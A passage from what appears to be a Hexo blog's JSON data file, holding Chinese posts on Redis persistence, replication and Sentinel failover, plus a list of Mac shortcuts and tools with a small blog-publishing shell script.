秒内有至少有 1000 个键被改动”这一条件时， 自动保存一次数据集:<br>save 60 1000</li>\n<li>aof配置<br>appendonly yes  启用<br>appendfsync always 每次有新命令追加到 AOF 文件时就执行一次 fsync ：非常慢，也非常安全<br>appendfsync everysec 每秒 fsync 一次：足够快（和使用 RDB 持久化差不多），并且在故障时只会丢失 1 秒钟的数据。<br>appendfsync no 从不 fsync ：将数据交给操作系统来处理。更快，也更不安全的选择。<br>配置好，启动服务之后，在你程序的目录会出现二个文件，一个是dump.rdb,一个是appendonly.aof</li>\n<li>RDB和AOF 之间的相互作用</li>\n</ul>\n<ol>\n<li>当 Redis 启动时，如果RDB持久化和AOF持久化都被打开了，那么程序会优先使用 AOF 文件来恢复数据集，因为 AOF 文件所保存的数据通常是最完整的。</li>\n<li>Redis为了防止两个后台(RDB和AOF)进程同时对磁盘进行大量的 I/O 操作。redis在RDB Save的过程中，不会执行 AOF RewriteAOF。反之,在AOF RewriteAOF执行的过程中，也不会执行RDB Save。</li>\n</ol>\n","excerpt":"<p>redis提供二种持久化方式:一种是RDB,另一种是AOF.<br>RDB持久化可以在指定的时间间隔内生成数据集的时间点快照（point-in-time snapshot）。<br>AOF持久化记录服务器执行的所有写操作命令，并在服务器启动时，通过重新执行这些命令来还原数据集。 AOF 文件中的命令全部以 Redis 协议的格式来保存，新命令会被追加到文件的末尾。 Redis 还可以在后台对 AOF 文件进行重写（rewrite），使得 AOF 文件的体积不会超出保存数据集状态所需的实际大小。<br>","more":"</p>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><ul>\n<li>rdb配置<br>比如说， 以下设置会让 Redis 在满足“ 60 秒内有至少有 1000 个键被改动”这一条件时， 自动保存一次数据集:<br>save 60 1000</li>\n<li>aof配置<br>appendonly yes  启用<br>appendfsync always 每次有新命令追加到 AOF 文件时就执行一次 fsync ：非常慢，也非常安全<br>appendfsync everysec 每秒 fsync 一次：足够快（和使用 RDB 持久化差不多），并且在故障时只会丢失 1 秒钟的数据。<br>appendfsync no 从不 fsync ：将数据交给操作系统来处理。更快，也更不安全的选择。<br>配置好，启动服务之后，在你程序的目录会出现二个文件，一个是dump.rdb,一个是appendonly.aof</li>\n<li>RDB和AOF 之间的相互作用</li>\n</ul>\n<ol>\n<li>当 Redis 启动时，如果RDB持久化和AOF持久化都被打开了，那么程序会优先使用 AOF 文件来恢复数据集，因为 AOF 文件所保存的数据通常是最完整的。</li>\n<li>Redis为了防止两个后台(RDB和AOF)进程同时对磁盘进行大量的 I/O 操作。redis在RDB Save的过程中，不会执行 AOF RewriteAOF。反之,在AOF RewriteAOF执行的过程中，也不会执行RDB Save。</li>\n</ol>"},{"title":"索引","date":"2015-12-19T16:00:00.000Z","desc":"博客索引","_content":"\n![图](http://binyanbin.github.io/img/mywechat.png)","source":"_posts/self-introduce.md","raw":"---\ntitle: 索引\ndate: 2015-12-20\ndesc: 博客索引\n---\n\n![图](http://binyanbin.github.io/img/mywechat.png)","slug":"self-introduce","published":1,"updated":"2016-09-09T13:53:14.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llu0000yg2x63je6gyga","content":"<p><img src=\"http://binyanbin.github.io/img/mywechat.png\" alt=\"图\"></p>\n","excerpt":"","more":"<p><img src=\"http://binyanbin.github.io/img/mywechat.png\" alt=\"图\"></p>\n"},{"title":"我的mac精华浓缩版","date":"2016-09-03T16:00:00.000Z","desc":"mac 快捷键 效率工具","_content":"\n## 快捷键\n\n1.mac基础:\nctrl+上下左右   切屏\ncmd+上下左右  定位 \ncmd+shift+上下左右  定位+选择\nfn+上下左右  滚动\nctrl+cmd+f  全屏\ncmd+w 关闭当前窗口\ncmd+q 退出应用程序\n\n2.chrome\ncmd+l 地址栏\ncmd+option+左右 切页面\nctrl+tab 切页面\ncmd+t 新页面\ncmd+w 关闭页面\ncmd+shift+w 关闭窗口\ncmd+option+i 开发者工具\n\n3.vim\n:set number 显示行号\n:syntax on 语法显示\n:%d 删除全部内容\nw下一个单词\nb上一个单词\ngg文件首\nＧ文件尾\n0行首\n^行首文字\n$行尾\ndd删除当前行\n3x 删除后3个字符 3X 删除前3个个字符\n1G 调到第11行\nCtrl+f Ctrl+b 翻页\n/word 查找 n 查找下一个\nu  ctrl+r   撤销 重做\n\n\n4.bash\nctrl+a 开头\nctrl+e 结毛\nctrl+k 清除光标后至行尾\nctrl+u清除光标至之前\ntab 补全\nctrl+c 终止\n\n5.sublime\nctrl+k+b 目录显示/隐藏\ncmd+option+number 分屏\nctrl+shift+number 移屏\ncmd+option+左右 切文件\nctrl+tab 切文件\ncmd+n 创建新文件\ncmd+p 查找文件\ncmd+shift+p  插件命令\ncmd+alt+g 快找\ncmd+f 查找 alt+cmd+r 正则\ncmd+shift+f 替换\ncmd+k+u 大写 cmd+k+l 小写\ncmd+k+num 折到第几层\ncmd+k+j 全部展开\ncmd+k+k 删除到行末尾\ncmd+w 关闭文件 \ncmd+shift+w 关闭窗口\nctrl+shift+k 删除行\nF6 拼写检查\n\n6.eclispe\ncmd+e 已打开文件\ncmd+o 文件导航\ncmd+alt+s 生成\ncmd+f7 切换窗体\nf3 转定义\ncmd+shift+g 转引用\ncmd+shift+r 打开文件\ncmd+shift+h 打开类型\ncmd+alt+r 重命名\ncmd+1 快速修复\nctrl+q 回到最后一次编辑的地方\nalt+/  内容提示\ncmd+/ 注释\ncmd+t 查看继承关系\ncmd+shift+f 格式化\ncmd+alt+j 添加完整注释\nctrl+m 隐藏package\ncmd+shift+[ 分坚屏\n\n## mac神器\n\n1.Alfred  效率神器\n2.iTerm  terminal分屏神器\n3.CatchMouse  多屏必备\n\n## 跨平台工具\n\n1.Eclipse  \n2.Workbench  mysql必备\n3.Sublime Text   \n4.Evernode 印像笔记\n5.Chrome  \n6.Postman  api测试专用\n7.AxaTools  小工具集合，各种转换计算和正则测试。\n8.atash UML作图专用\n9.Jmeter  性能测试\n10.Xccello 个人/团队任务管理\n\n\n## 附赠hexo blog发布脚本\n\n``` bash\n#!/bin/bash\ncd ~/Documents/git/blog\nhexo clean\nhexo g\ncp -r ~/Documents/git/blog/public/ ~/Documents/git/binyanbin.github.io/\ncd ~/Documents/git/binaynbin.github.io/\ngit add .\ngit commit -m 'submit'\ngit push\n```\n\n持续补充中......","source":"_posts/shortcut.md","raw":"---\ntitle: 我的mac精华浓缩版\ndate: 2016-9-4\ndesc: mac 快捷键 效率工具\n---\n\n## 快捷键\n\n1.mac基础:\nctrl+上下左右   切屏\ncmd+上下左右  定位 \ncmd+shift+上下左右  定位+选择\nfn+上下左右  滚动\nctrl+cmd+f  全屏\ncmd+w 关闭当前窗口\ncmd+q 退出应用程序\n\n2.chrome\ncmd+l 地址栏\ncmd+option+左右 切页面\nctrl+tab 切页面\ncmd+t 新页面\ncmd+w 关闭页面\ncmd+shift+w 关闭窗口\ncmd+option+i 开发者工具\n\n3.vim\n:set number 显示行号\n:syntax on 语法显示\n:%d 删除全部内容\nw下一个单词\nb上一个单词\ngg文件首\nＧ文件尾\n0行首\n^行首文字\n$行尾\ndd删除当前行\n3x 删除后3个字符 3X 删除前3个个字符\n1G 调到第11行\nCtrl+f Ctrl+b 翻页\n/word 查找 n 查找下一个\nu  ctrl+r   撤销 重做\n\n\n4.bash\nctrl+a 开头\nctrl+e 结毛\nctrl+k 清除光标后至行尾\nctrl+u清除光标至之前\ntab 补全\nctrl+c 终止\n\n5.sublime\nctrl+k+b 目录显示/隐藏\ncmd+option+number 分屏\nctrl+shift+number 移屏\ncmd+option+左右 切文件\nctrl+tab 切文件\ncmd+n 创建新文件\ncmd+p 查找文件\ncmd+shift+p  插件命令\ncmd+alt+g 快找\ncmd+f 查找 alt+cmd+r 正则\ncmd+shift+f 替换\ncmd+k+u 大写 cmd+k+l 小写\ncmd+k+num 折到第几层\ncmd+k+j 全部展开\ncmd+k+k 删除到行末尾\ncmd+w 关闭文件 \ncmd+shift+w 关闭窗口\nctrl+shift+k 删除行\nF6 拼写检查\n\n6.eclispe\ncmd+e 已打开文件\ncmd+o 文件导航\ncmd+alt+s 生成\ncmd+f7 切换窗体\nf3 转定义\ncmd+shift+g 转引用\ncmd+shift+r 打开文件\ncmd+shift+h 打开类型\ncmd+alt+r 重命名\ncmd+1 快速修复\nctrl+q 回到最后一次编辑的地方\nalt+/  内容提示\ncmd+/ 注释\ncmd+t 查看继承关系\ncmd+shift+f 格式化\ncmd+alt+j 添加完整注释\nctrl+m 隐藏package\ncmd+shift+[ 分坚屏\n\n## mac神器\n\n1.Alfred  效率神器\n2.iTerm  terminal分屏神器\n3.CatchMouse  多屏必备\n\n## 跨平台工具\n\n1.Eclipse  \n2.Workbench  mysql必备\n3.Sublime Text   \n4.Evernode 印像笔记\n5.Chrome  \n6.Postman  api测试专用\n7.AxaTools  小工具集合，各种转换计算和正则测试。\n8.atash UML作图专用\n9.Jmeter  性能测试\n10.Xccello 个人/团队任务管理\n\n\n## 附赠hexo blog发布脚本\n\n``` bash\n#!/bin/bash\ncd ~/Documents/git/blog\nhexo clean\nhexo g\ncp -r ~/Documents/git/blog/public/ ~/Documents/git/binyanbin.github.io/\ncd ~/Documents/git/binaynbin.github.io/\ngit add .\ngit commit -m 'submit'\ngit push\n```\n\n持续补充中......","slug":"shortcut","published":1,"updated":"2016-09-09T17:05:10.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llu1000zg2x6ky1jaum0","content":"<h2 id=\"快捷键\"><a href=\"#快捷键\" class=\"headerlink\" title=\"快捷键\"></a>快捷键</h2><p>1.mac基础:<br>ctrl+上下左右   切屏<br>cmd+上下左右  定位<br>cmd+shift+上下左右  定位+选择<br>fn+上下左右  滚动<br>ctrl+cmd+f  全屏<br>cmd+w 关闭当前窗口<br>cmd+q 退出应用程序</p>\n<p>2.chrome<br>cmd+l 地址栏<br>cmd+option+左右 切页面<br>ctrl+tab 切页面<br>cmd+t 新页面<br>cmd+w 关闭页面<br>cmd+shift+w 关闭窗口<br>cmd+option+i 开发者工具</p>\n<p>3.vim<br>:set number 显示行号<br>:syntax on 语法显示<br>:%d 删除全部内容<br>w下一个单词<br>b上一个单词<br>gg文件首<br>Ｇ文件尾<br>0行首<br>^行首文字<br>$行尾<br>dd删除当前行<br>3x 删除后3个字符 3X 删除前3个个字符<br>1G 调到第11行<br>Ctrl+f Ctrl+b 翻页<br>/word 查找 n 查找下一个<br>u  ctrl+r   撤销 重做</p>\n<p>4.bash<br>ctrl+a 开头<br>ctrl+e 结毛<br>ctrl+k 清除光标后至行尾<br>ctrl+u清除光标至之前<br>tab 补全<br>ctrl+c 终止</p>\n<p>5.sublime<br>ctrl+k+b 目录显示/隐藏<br>cmd+option+number 分屏<br>ctrl+shift+number 移屏<br>cmd+option+左右 切文件<br>ctrl+tab 切文件<br>cmd+n 创建新文件<br>cmd+p 查找文件<br>cmd+shift+p  插件命令<br>cmd+alt+g 快找<br>cmd+f 查找 alt+cmd+r 正则<br>cmd+shift+f 替换<br>cmd+k+u 大写 cmd+k+l 小写<br>cmd+k+num 折到第几层<br>cmd+k+j 全部展开<br>cmd+k+k 删除到行末尾<br>cmd+w 关闭文件<br>cmd+shift+w 关闭窗口<br>ctrl+shift+k 删除行<br>F6 拼写检查</p>\n<p>6.eclispe<br>cmd+e 已打开文件<br>cmd+o 文件导航<br>cmd+alt+s 生成<br>cmd+f7 切换窗体<br>f3 转定义<br>cmd+shift+g 转引用<br>cmd+shift+r 打开文件<br>cmd+shift+h 打开类型<br>cmd+alt+r 重命名<br>cmd+1 快速修复<br>ctrl+q 回到最后一次编辑的地方<br>alt+/  内容提示<br>cmd+/ 注释<br>cmd+t 查看继承关系<br>cmd+shift+f 格式化<br>cmd+alt+j 添加完整注释<br>ctrl+m 隐藏package<br>cmd+shift+[ 分坚屏</p>\n<h2 id=\"mac神器\"><a href=\"#mac神器\" class=\"headerlink\" title=\"mac神器\"></a>mac神器</h2><p>1.Alfred  效率神器<br>2.iTerm  terminal分屏神器<br>3.CatchMouse  多屏必备</p>\n<h2 id=\"跨平台工具\"><a href=\"#跨平台工具\" class=\"headerlink\" title=\"跨平台工具\"></a>跨平台工具</h2><p>1.Eclipse<br>2.Workbench  mysql必备<br>3.Sublime Text<br>4.Evernode 印像笔记<br>5.Chrome<br>6.Postman  api测试专用<br>7.AxaTools  小工具集合，各种转换计算和正则测试。<br>8.atash UML作图专用<br>9.Jmeter  性能测试<br>10.Xccello 个人/团队任务管理</p>\n<h2 id=\"附赠hexo-blog发布脚本\"><a href=\"#附赠hexo-blog发布脚本\" class=\"headerlink\" title=\"附赠hexo blog发布脚本\"></a>附赠hexo blog发布脚本</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/Documents/git/blog</span><br><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">cp -r ~/Documents/git/blog/public/ ~/Documents/git/binyanbin.github.io/</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/Documents/git/binaynbin.github.io/</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">'submit'</span></span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure>\n<p>持续补充中……</p>\n","excerpt":"","more":"<h2 id=\"快捷键\"><a href=\"#快捷键\" class=\"headerlink\" title=\"快捷键\"></a>快捷键</h2><p>1.mac基础:<br>ctrl+上下左右   切屏<br>cmd+上下左右  定位<br>cmd+shift+上下左右  定位+选择<br>fn+上下左右  滚动<br>ctrl+cmd+f  全屏<br>cmd+w 关闭当前窗口<br>cmd+q 退出应用程序</p>\n<p>2.chrome<br>cmd+l 地址栏<br>cmd+option+左右 切页面<br>ctrl+tab 切页面<br>cmd+t 新页面<br>cmd+w 关闭页面<br>cmd+shift+w 关闭窗口<br>cmd+option+i 开发者工具</p>\n<p>3.vim<br>:set number 显示行号<br>:syntax on 语法显示<br>:%d 删除全部内容<br>w下一个单词<br>b上一个单词<br>gg文件首<br>Ｇ文件尾<br>0行首<br>^行首文字<br>$行尾<br>dd删除当前行<br>3x 删除后3个字符 3X 删除前3个个字符<br>1G 调到第11行<br>Ctrl+f Ctrl+b 翻页<br>/word 查找 n 查找下一个<br>u  ctrl+r   撤销 重做</p>\n<p>4.bash<br>ctrl+a 开头<br>ctrl+e 结毛<br>ctrl+k 清除光标后至行尾<br>ctrl+u清除光标至之前<br>tab 补全<br>ctrl+c 终止</p>\n<p>5.sublime<br>ctrl+k+b 目录显示/隐藏<br>cmd+option+number 分屏<br>ctrl+shift+number 移屏<br>cmd+option+左右 切文件<br>ctrl+tab 切文件<br>cmd+n 创建新文件<br>cmd+p 查找文件<br>cmd+shift+p  插件命令<br>cmd+alt+g 快找<br>cmd+f 查找 alt+cmd+r 正则<br>cmd+shift+f 替换<br>cmd+k+u 大写 cmd+k+l 小写<br>cmd+k+num 折到第几层<br>cmd+k+j 全部展开<br>cmd+k+k 删除到行末尾<br>cmd+w 关闭文件<br>cmd+shift+w 关闭窗口<br>ctrl+shift+k 删除行<br>F6 拼写检查</p>\n<p>6.eclispe<br>cmd+e 已打开文件<br>cmd+o 文件导航<br>cmd+alt+s 生成<br>cmd+f7 切换窗体<br>f3 转定义<br>cmd+shift+g 转引用<br>cmd+shift+r 打开文件<br>cmd+shift+h 打开类型<br>cmd+alt+r 重命名<br>cmd+1 快速修复<br>ctrl+q 回到最后一次编辑的地方<br>alt+/  内容提示<br>cmd+/ 注释<br>cmd+t 查看继承关系<br>cmd+shift+f 格式化<br>cmd+alt+j 添加完整注释<br>ctrl+m 隐藏package<br>cmd+shift+[ 分坚屏</p>\n<h2 id=\"mac神器\"><a href=\"#mac神器\" class=\"headerlink\" title=\"mac神器\"></a>mac神器</h2><p>1.Alfred  效率神器<br>2.iTerm  terminal分屏神器<br>3.CatchMouse  多屏必备</p>\n<h2 id=\"跨平台工具\"><a href=\"#跨平台工具\" class=\"headerlink\" title=\"跨平台工具\"></a>跨平台工具</h2><p>1.Eclipse<br>2.Workbench  mysql必备<br>3.Sublime Text<br>4.Evernode 印像笔记<br>5.Chrome<br>6.Postman  api测试专用<br>7.AxaTools  小工具集合，各种转换计算和正则测试。<br>8.atash UML作图专用<br>9.Jmeter  性能测试<br>10.Xccello 个人/团队任务管理</p>\n<h2 id=\"附赠hexo-blog发布脚本\"><a href=\"#附赠hexo-blog发布脚本\" class=\"headerlink\" title=\"附赠hexo blog发布脚本\"></a>附赠hexo blog发布脚本</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/Documents/git/blog</span><br><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">cp -r ~/Documents/git/blog/public/ ~/Documents/git/binyanbin.github.io/</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ~/Documents/git/binaynbin.github.io/</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">'submit'</span></span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure>\n<p>持续补充中……</p>\n"},{"title":"redis学习7 主从复制","date":"2016-03-08T16:00:00.000Z","desc":"redis  主从复制","_content":"redis集群有二种方式，一种分区，一种主从复制。\nredis的主从复制功能非常强大，一个master可以拥有多个slave，而一个slave又可以拥有多个slave，如此下去，形成了强大的多级服务器集群架构。下面是关于redis主从复制的一些特点：\n* master可以有多个slave\n* 除了多个slave连到相同的master外，slave也可以连接其他slave形成图状结构\n* 主从复制不会阻塞master。也就是说当一个或多个slave与master进行初次同步数据时，master可以继续处理client发来的请求。相反slave在初次同步数据时则会阻塞不能处理client的请求。\n* 主从复制可以用来提高系统的可伸缩性,我们可以用多个slave专门用于client的读请求，比如sort操作可以使用slave来处理。也可以用来做简单的数据冗余\n*可以在master禁用数据持久化，只需要注释掉master配置文件中的所有save配置，然后只在slave上配置数据持久化。\n<!-- more -->\n## 配置\n* 把安装好的redis做master,然后copy一份当slave。然后修改slave配置\nport 6379  修改为port 6380\nslaveof 127.0.0.1 6379  (映射到主服务器上)\n* 配置完成以后可以在二个服务中分别进行set和get操作来看效果,master可以get和set操作,slave上能get操作不能set，也就是说master可读可写，slave只能读。你在master上set数据，slave上可以查询得到。\n* 在master和slave分别执行info命令，查看结果如下：\n![master](/img/info1.png)\n![slave](/img/info2.png)\n","source":"_posts/redis-7.md","raw":"---\ntitle: redis学习7 主从复制\ndate: 2016-3-9\ndesc: redis  主从复制\n---\nredis集群有二种方式，一种分区，一种主从复制。\nredis的主从复制功能非常强大，一个master可以拥有多个slave，而一个slave又可以拥有多个slave，如此下去，形成了强大的多级服务器集群架构。下面是关于redis主从复制的一些特点：\n* master可以有多个slave\n* 除了多个slave连到相同的master外，slave也可以连接其他slave形成图状结构\n* 主从复制不会阻塞master。也就是说当一个或多个slave与master进行初次同步数据时，master可以继续处理client发来的请求。相反slave在初次同步数据时则会阻塞不能处理client的请求。\n* 主从复制可以用来提高系统的可伸缩性,我们可以用多个slave专门用于client的读请求，比如sort操作可以使用slave来处理。也可以用来做简单的数据冗余\n*可以在master禁用数据持久化，只需要注释掉master配置文件中的所有save配置，然后只在slave上配置数据持久化。\n<!-- more -->\n## 配置\n* 把安装好的redis做master,然后copy一份当slave。然后修改slave配置\nport 6379  修改为port 6380\nslaveof 127.0.0.1 6379  (映射到主服务器上)\n* 配置完成以后可以在二个服务中分别进行set和get操作来看效果,master可以get和set操作,slave上能get操作不能set，也就是说master可读可写，slave只能读。你在master上set数据，slave上可以查询得到。\n* 在master和slave分别执行info命令，查看结果如下：\n![master](/img/info1.png)\n![slave](/img/info2.png)\n","slug":"redis-7","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llu20010g2x690u24ykp","content":"<p>redis集群有二种方式，一种分区，一种主从复制。<br>redis的主从复制功能非常强大，一个master可以拥有多个slave，而一个slave又可以拥有多个slave，如此下去，形成了强大的多级服务器集群架构。下面是关于redis主从复制的一些特点：</p>\n<ul>\n<li>master可以有多个slave</li>\n<li>除了多个slave连到相同的master外，slave也可以连接其他slave形成图状结构</li>\n<li>主从复制不会阻塞master。也就是说当一个或多个slave与master进行初次同步数据时，master可以继续处理client发来的请求。相反slave在初次同步数据时则会阻塞不能处理client的请求。</li>\n<li>主从复制可以用来提高系统的可伸缩性,我们可以用多个slave专门用于client的读请求，比如sort操作可以使用slave来处理。也可以用来做简单的数据冗余<br>*可以在master禁用数据持久化，只需要注释掉master配置文件中的所有save配置，然后只在slave上配置数据持久化。<a id=\"more\"></a>\n<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2></li>\n<li>把安装好的redis做master,然后copy一份当slave。然后修改slave配置<br>port 6379  修改为port 6380<br>slaveof 127.0.0.1 6379  (映射到主服务器上)</li>\n<li>配置完成以后可以在二个服务中分别进行set和get操作来看效果,master可以get和set操作,slave上能get操作不能set，也就是说master可读可写，slave只能读。你在master上set数据，slave上可以查询得到。</li>\n<li>在master和slave分别执行info命令，查看结果如下：<br><img src=\"/img/info1.png\" alt=\"master\"><br><img src=\"/img/info2.png\" alt=\"slave\"></li>\n</ul>\n","excerpt":"<p>redis集群有二种方式，一种分区，一种主从复制。<br>redis的主从复制功能非常强大，一个master可以拥有多个slave，而一个slave又可以拥有多个slave，如此下去，形成了强大的多级服务器集群架构。下面是关于redis主从复制的一些特点：</p>\n<ul>\n<li>master可以有多个slave</li>\n<li>除了多个slave连到相同的master外，slave也可以连接其他slave形成图状结构</li>\n<li>主从复制不会阻塞master。也就是说当一个或多个slave与master进行初次同步数据时，master可以继续处理client发来的请求。相反slave在初次同步数据时则会阻塞不能处理client的请求。</li>\n<li>主从复制可以用来提高系统的可伸缩性,我们可以用多个slave专门用于client的读请求，比如sort操作可以使用slave来处理。也可以用来做简单的数据冗余<br>*可以在master禁用数据持久化，只需要注释掉master配置文件中的所有save配置，然后只在slave上配置数据持久化。","more":"<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2></li>\n<li>把安装好的redis做master,然后copy一份当slave。然后修改slave配置<br>port 6379  修改为port 6380<br>slaveof 127.0.0.1 6379  (映射到主服务器上)</li>\n<li>配置完成以后可以在二个服务中分别进行set和get操作来看效果,master可以get和set操作,slave上能get操作不能set，也就是说master可读可写，slave只能读。你在master上set数据，slave上可以查询得到。</li>\n<li>在master和slave分别执行info命令，查看结果如下：<br><img src=\"/img/info1.png\" alt=\"master\"><br><img src=\"/img/info2.png\" alt=\"slave\"></li>\n</ul>"},{"title":"redis学习8  Sentinel集群控制","date":"2016-03-09T16:00:00.000Z","desc":"redis  Sentinel 集群","_content":"Redis-Sentinel是Redis官方推荐的高可用性(HA)解决方案，当用Redis做Master-slave的高可用方案时，假如master宕机了，Redis本身(包括它的很多客户端)都没有实现自动进行主备切换，而Redis-sentinel本身也是一个独立运行的进程，它能监控多个master-slave集群，发现master宕机后能进行自懂切换。\n<!-- more -->\n## Sentinel任务\n* 监控:Sentinel 会不断地检查你的主服务器和从服务器是否运作正常。\n* 提醒:当被监控的某个Redis服务器出现问题时,Sentinel 可以通过API向管理员或者其他应用程序发送通知。\n* 自动故障迁移:当一个主服务器不能正常工作时,Sentinel 会开始一次自动故障迁移操作， 它会将失效主服务器的其中一个从服务器升级为新的主服务器, 并让失效主服务器的其他从服务器改为复制新的主服务器;当客户端试图连接失效的主服务器时,集群也会向客户端返回新主服务器的地址,使得集群可以使用新主服务器代替失效服务器。\n\n## 配置Sentinel\n下面是一个Sentinel的标准配置\nport 26370\nsentinel monitor master 127.0.0.1 6381 1\nsentinel auth-pass master yanbin\nsentinel down-after-milliseconds master 60000\nsentinel parallel-syncs master 5\n第一行配置指示Sentinel去监视一个名为master的主服务器,将这个主服务器判断为失效至少需要1个Sentinel同意。只要同意Sentinel的数量不达标,自动故障迁移就不会执行。\ndown-after-milliseconds 指定了Sentinel认为服务器已经断线所需的毫秒数。\nparallel-syncs 执行故障转移时,最多可以有多少个从服务器同时对新的主服务器进行同步,数字越小,完成故障转移所需的时间就越长。\nauth-pass 监视主服务器的密码。\n\n## 运行Sentinel\nSentinel配置在我这个windows 2.8这个版本中是没有的，我自建了一个sentinel.conf配置文件。然后使用命令行启动Sentinel：\nredis-server  sentinel.conf --sentinel\n\n\n## 故障演示\n\n集群配置最少需要启动三个服务，我启动了4个服务分别是\n127.0.0.1:26370 （redis sentinel 集群监控）\n127.0.0.1:6379  （redis 主）\n127.0.0.1:6380  （redis 从）\n127.0.0.1:6381  （redis 从）\n查看网络状态\n``` bash\n$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\nSentinel\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6379,slaves=2,sentinels=1\n``` \n\n接着我关闭一个服务\n\n``` bash\nredis-cli -h 127.0.0.1 -p 6379 shutdow\n``` \n过了一会再次查看网络\n``` bash\n$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\n#Sentinel\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6381,slaves=1,sentinels=1\n``` \n6381变成主redis,可以write操作。\n再次启动6379\n``` bash\n$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\n#Sentinel\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6381,slaves=2,sentinels=1\n``` \n6379已不是主redis，变成了从redis,不能再write操作，只能read.\n\n","source":"_posts/redis-8.md","raw":"---\ntitle: redis学习8  Sentinel集群控制\ndate: 2016-3-10\ndesc: redis  Sentinel 集群\n---\nRedis-Sentinel是Redis官方推荐的高可用性(HA)解决方案，当用Redis做Master-slave的高可用方案时，假如master宕机了，Redis本身(包括它的很多客户端)都没有实现自动进行主备切换，而Redis-sentinel本身也是一个独立运行的进程，它能监控多个master-slave集群，发现master宕机后能进行自懂切换。\n<!-- more -->\n## Sentinel任务\n* 监控:Sentinel 会不断地检查你的主服务器和从服务器是否运作正常。\n* 提醒:当被监控的某个Redis服务器出现问题时,Sentinel 可以通过API向管理员或者其他应用程序发送通知。\n* 自动故障迁移:当一个主服务器不能正常工作时,Sentinel 会开始一次自动故障迁移操作， 它会将失效主服务器的其中一个从服务器升级为新的主服务器, 并让失效主服务器的其他从服务器改为复制新的主服务器;当客户端试图连接失效的主服务器时,集群也会向客户端返回新主服务器的地址,使得集群可以使用新主服务器代替失效服务器。\n\n## 配置Sentinel\n下面是一个Sentinel的标准配置\nport 26370\nsentinel monitor master 127.0.0.1 6381 1\nsentinel auth-pass master yanbin\nsentinel down-after-milliseconds master 60000\nsentinel parallel-syncs master 5\n第一行配置指示Sentinel去监视一个名为master的主服务器,将这个主服务器判断为失效至少需要1个Sentinel同意。只要同意Sentinel的数量不达标,自动故障迁移就不会执行。\ndown-after-milliseconds 指定了Sentinel认为服务器已经断线所需的毫秒数。\nparallel-syncs 执行故障转移时,最多可以有多少个从服务器同时对新的主服务器进行同步,数字越小,完成故障转移所需的时间就越长。\nauth-pass 监视主服务器的密码。\n\n## 运行Sentinel\nSentinel配置在我这个windows 2.8这个版本中是没有的，我自建了一个sentinel.conf配置文件。然后使用命令行启动Sentinel：\nredis-server  sentinel.conf --sentinel\n\n\n## 故障演示\n\n集群配置最少需要启动三个服务，我启动了4个服务分别是\n127.0.0.1:26370 （redis sentinel 集群监控）\n127.0.0.1:6379  （redis 主）\n127.0.0.1:6380  （redis 从）\n127.0.0.1:6381  （redis 从）\n查看网络状态\n``` bash\n$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\nSentinel\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6379,slaves=2,sentinels=1\n``` \n\n接着我关闭一个服务\n\n``` bash\nredis-cli -h 127.0.0.1 -p 6379 shutdow\n``` \n过了一会再次查看网络\n``` bash\n$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\n#Sentinel\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6381,slaves=1,sentinels=1\n``` \n6381变成主redis,可以write操作。\n再次启动6379\n``` bash\n$ redis-cli -h 127.0.0.1 -p 26380 info Sentinel\n#Sentinel\nsentinel_masters:1\nsentinel_tilt:0\nsentinel_running_scripts:0\nsentinel_scripts_queue_length:0\nmaster0:name=master,status=ok,address=127.0.0.1:6381,slaves=2,sentinels=1\n``` 